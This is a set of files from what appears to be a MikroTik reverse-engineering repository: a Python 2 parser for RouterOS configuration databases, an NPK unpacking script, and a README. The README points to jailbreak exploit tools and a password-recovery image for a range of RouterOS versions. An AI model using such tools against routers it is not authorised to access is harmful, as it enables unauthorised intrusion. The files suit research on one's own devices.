				warn("Record contains multiple blocks %06X that translate to the same ID (\"%s\"), ignoring extra blocks. Check your mapping and idFormat." % (bidraw, bid))
			else:
				if self.returnTypes:
					alldata[bid] = (btype,data)
				else:
					alldata[bid] = data
			
			bpointer += blen

		return alldata
		
		
		
	def mapBlockNames(self, mapping):
		self.mapping.update(mapping)
		self.decode = True

	def addParser(self, blockid, function):
		self.parsers[blockid] = function
		
	def addFilter(self, blocktype, function):
		self.filters[blocktype] = function


if __name__ == '__main__':
	
	store="."
	names = ["group"]
	for dbname in names:
		conf = MTConfig(store + "/" + dbname + ".dat", store + "/" + dbname + ".idx")
		conf.returnTypes = True
		conf.preserveOrder = True
		
		for record in conf:
			print "Start of record"
			
			for block in record:
				(btype,data) = record[block]
				print "(%02X) %s %s %s%s" % (btype, block, type(data), "{%i} "%len(data) if isinstance(data,(str,list,dict)) else "","" if (btype & 0x28 == 0x28) else data)
				if btype & 0x28 == 0x28:
					if btype & 0x80 != 0x80:
						data=[data]
					
					for item in data:
						if btype & 0x80 == 0x80:
							print "   -> (%02X) %s %s {%i}" % (btype & ~0x80, block, type(data), len(item))
						for block_s in item:
							(btype_s,data_s) = item[block_s]
							print "   "*(2 if (btype & 0x80 == 0x80) else 1)+"-> (%02X) %s %s %s%s" % (btype_s, block_s, type(data_s),"{%i} "%len(data_s) if isinstance(data_s,(str,list,dict)) else "", data_s)
						

			print "End of record"
			print




File: /README.md
# mikrotik-tools
Tools for Mikrotik devices

![Mikrotik ecosystem](https://github.com/0ki/mikrotik-tools/raw/master/mikrotik_eco.png)

The universal jailbreak tool is available in "exploit-backup". This tool supports versions 2.9.8 to [6.41rc56](https://twitter.com/KirilsSolovjovs/status/949037242621849601). To use it, download the folder and launch exploit_full.sh.

Later versions 6.41 to 6.44.3 (and beyond) are supported by the universal jailbreak tool in "exploit-defconf". Under most circumstances this requires that your device supports attaching a disk, e.g. via USB port.

The current version of the stand-alone jailbreak and password recovery tool is available from: http://02.lv/f/2018/01/06/MT_JB_0.92.ova. This tool supports all current versions including 6.41+. **Please note that updating your device at any point after the jailbreak might make it unstable or brick it.**

How-to on slide Nr.59: http://kirils.org/slides/2017-09-15_prez_15_MT_Balccon_pub.pdf

![NPK parts](https://github.com/0ki/mikrotik-tools/raw/master/npk_descriptions.png)



File: /reversenpk.sh
#!/bin/bash
# (C) Kirils Solovjovs, 2017

[ -z "$1" ] && echo "Usage: $0 <filename.npk>" && exit 1
[ ! -f "$1" ] && echo "File not found." && exit 2
folder="$(echo $1 | rev | cut -d \.  -f 2- | cut -d \- -f 1 | rev )"
mkdir -p "./$folder"
unnpk -xf $1 -C "./$folder"
cd "./$folder"
[ -f "system.squashfs" ] && unsquashfs system.squashfs


